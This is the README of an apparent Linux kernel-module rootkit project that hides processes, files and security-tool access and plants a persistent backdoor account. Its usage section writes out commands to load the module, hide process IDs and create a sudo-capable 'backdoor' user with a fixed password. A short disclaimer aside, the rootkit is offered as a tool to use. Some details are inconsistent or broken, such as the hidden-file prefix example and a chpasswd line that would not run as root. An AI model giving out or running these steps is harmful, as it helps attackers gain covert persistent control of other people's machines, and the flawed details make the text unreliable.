# Stealthy Linux Rootkit - Hidden Process and File Manipulation

## Overview
This project is a stealthy Linux rootkit implemented as a kernel module (LKM). It is designed to hide processes, files, and directories from detection. It hooks into system calls such as `getdents64` and `open` to manipulate system behavior and provides a hidden backdoor user for persistent access.

## Features
- Hides processes from `/proc` to prevent detection.
- Hooks `getdents64` to make specific files and directories invisible.
- Intercepts system calls to prevent logging and monitoring.
- Creates a backdoor user with `sudo` access.
- Operates as a Loadable Kernel Module (LKM) for easy installation and removal.

## Tech Stack

- C
- Linux kernel module APIs
- Linux syscall table hook concepts
- GCC and kernel headers for local builds

## Project Structure
- `rootkit.c` - The main kernel module that hooks system calls.
- `Makefile` - Compilation instructions for building the kernel module.
- `README.md` - Project documentation.

## Installation Guide
1. Clone the repository:
   
   cd Stealthy-Linux-Rootkit
   
2. Compile the rootkit:
   
   make
   
3. Load the rootkit:
   
   sudo insmod rootkit.ko
   
4. Verify that the rootkit is running:
   
   dmesg | tail -n 10
   

## Usage
1. Hide a process:
   
   echo "1234" > /proc/hide_pid  # Replace 1234 with the process ID to hide
   
2. Hide a file or directory:
   
   touch /root/.hidden_file  # Files prefixed with "hidden_" will be invisible
   
3. Create a backdoor user:
   
   sudo useradd -m -G sudo -s /bin/bash backdoor
   sudo echo 'backdoor:rootpass' | chpasswd
   
4. Remove the rootkit:
   
   sudo rmmod rootkit
   

## Technical Details
### Syscall Hooking
- Hooks `getdents64` to manipulate directory listings and hide specific files.
- Hooks `open` to prevent security tools from accessing certain files.

### Process Hiding
- Modifies `/proc` to remove hidden processes from visibility.

### Backdoor Access
- Creates a hidden user with elevated privileges.
- Can persist across reboots if modifications are made to `/etc/passwd`.

## Security Considerations
This rootkit is for educational and research purposes only. Do not deploy outside a controlled test environment.
- Can be detected by rootkit scanners like `chkrootkit` and `rkhunter`.
- Works best on Linux kernels below version 5.10 due to syscall hooking restrictions.
- Requires root permissions to install and manipulate system calls.

## Detection and Removal
To check if the system is infected:

lsmod | grep rootkit

To remove the rootkit:

sudo rmmod rootkit


## Author
- John Saurabh Battu  

